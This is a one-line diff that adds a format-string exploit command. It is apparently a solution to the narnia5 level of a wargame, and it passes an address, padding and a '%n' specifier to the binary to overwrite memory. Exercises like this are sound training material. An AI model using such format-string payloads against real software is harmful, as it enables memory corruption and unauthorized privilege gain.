@@ -1,0 +1,1 @@
+A= ./narnia5 $(python -c "print '\xf0\xd4\xff\xff' + 'x' * 496 + '%n'")
